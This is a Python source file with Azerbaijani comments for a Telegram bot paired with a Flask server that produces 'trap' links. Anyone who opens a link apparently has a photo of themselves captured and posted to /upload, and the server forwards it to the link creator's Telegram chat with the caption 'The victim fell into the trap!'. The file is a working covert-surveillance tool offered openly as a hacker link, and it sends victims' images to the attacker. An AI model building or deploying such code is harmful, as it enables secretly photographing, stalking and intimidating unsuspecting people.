import telebot
import os
import uuid
import base64
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
from threading import Thread

# --- KONFİQURASİYA ---
API_TOKEN = 'SƏNİN_BOT_TOKENİN'
DOMAIN = 'https://senin-saytin.vercel.app' # Sonra bura real linki qoyacağıq
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
CORS(app)

# Sadə verilənlər bazası (Token: Chat_ID)
# Professional versiyada SQLite istifadə oluna bilər
user_db = {}

# --- TELEGRAM BOT HİSSƏSİ ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "👋 Salam! Özəl xaker linki yaratmaq üçün /link yaz.")

@bot.message_handler(commands=['link'])
def create_link(message):
    chat_id = message.chat.id
    token = str(uuid.uuid4())[:8] # Hər kəs üçün unikal 8 rəqəmli kod
    user_db[token] = chat_id
    
    trap_url = f"{DOMAIN}/?t={token}"
    bot.reply_to(message, f"🚀 Sənin özəl linkin hazırdır:\n\n`{trap_url}`\n\nBu linkə girənin şəkli birbaşa bura gələcək.", parse_mode="Markdown")

# --- API (ŞƏKİL QƏBULU) HİSSƏSİ ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_photo():
    data = request.json
    token = data.get('token')
    image_b64 = data.get('image')

    if token in user_db:
        chat_id = user_db[token]
        # Base64-ü şəkil faylına çeviririk
        img_bytes = base64.b64decode(image_b64.split(',')[1])
        
        with open(f"temp_{token}.png", "wb") as f:
            f.write(img_bytes)
        
        # Telegram-a göndəririk
        with open(f"temp_{token}.png", "rb") as photo:
            bot.send_photo(chat_id, photo, caption="📸 Qurban tələyə düşdü!")
        
        os.remove(f"temp_{token}.png") # Faylı silirik (təmizlik)
        return jsonify({"status": "ok"}), 200
    
    return jsonify({"status": "error"}), 400

# Botu və Flask-ı eyni anda işlətmək üçün
def run_flask():
    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    Thread(target=run_flask).start()
    bot.infinity_polling()
